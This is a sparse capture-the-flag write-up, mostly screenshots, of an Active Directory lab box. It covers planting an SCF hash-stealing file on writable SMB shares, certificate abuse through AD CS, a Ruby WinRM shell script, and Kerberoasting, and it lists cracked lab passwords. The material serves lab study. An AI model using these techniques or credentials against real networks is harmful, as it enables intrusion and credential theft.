# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #ADCS #SMB #WinRM #Kerbeosting #DCsync #activedirectory #ntlm

# Findings
## External
### Enumeration
![](https://i.imgur.com/6KP9kP7.png)
![](https://i.imgur.com/Wpiuga5.png)
![](https://i.imgur.com/K5yeJo9.png)
![](https://i.imgur.com/YVD0I83.png)

![](https://i.imgur.com/QrmYsOE.png)
![](https://i.imgur.com/LgnNL8B.png)
![](https://i.imgur.com/cf3l31F.png)
>[!danger] No Kerberos 
- ![](https://i.imgur.com/g2BkC42.png)
- I got 2 writeable folders.
- ![](https://i.imgur.com/sAu8rYS.png)
![](https://i.imgur.com/wKdEGNI.png)
I have write Permission
![](https://i.imgur.com/Lw1gw3j.png)
- can place ntlm stealer on the smb and get their ntlm.
![](https://i.imgur.com/sPS3nek.png)
I putted the scf file on both writeable directories.
![](https://i.imgur.com/gewc9Zx.png)

![](https://i.imgur.com/iDkr20i.png)
![](https://i.imgur.com/74bbTA1.png)
`Ashare1972       (amanda)`
### Gaining Access
- Blood Hound
- ![](https://i.imgur.com/nVFVLF7.png)
	- This means it need some kinda SSL certs. for that we can use the AD CS
- From our web enum, we have seen CertEnroll, so there will be the AD CS endpoints
	- ![](https://i.imgur.com/ysxRa15.png)
![](https://i.imgur.com/xgxDCqr.png)
![](https://i.imgur.com/o3orL6v.png)
![](https://i.imgur.com/X06nHP9.png)
- https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
```ruby
require 'winrm'
 
conn = WinRM::Connection.new(
    endpoint: 'https://10.10.10.103:5986/wsman',
    transport: :ssl,
    client_cert: 'certnew.cer',
    client_key: 'caca.key',
:no_ssl_peer_verification => true
)
command=""
 
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
![](https://i.imgur.com/TL6E8Vt.png)
## Internal
### Enumeration
- Kerberoastable
	- ![](https://i.imgur.com/KO65OPb.png)
- ![](https://i.imgur.com/zwJGPom.png)
- ![](https://i.imgur.com/B7nWhBm.png)
`mrlky : Football#7`
- ![](https://i.imgur.com/XWrAgUU.png)
### Gaining Access
 ![](https://i.imgur.com/DUKaEz9.png)



### Maintaining Access
![](https://i.imgur.com/5iq7ZSO.png)


# Random Notes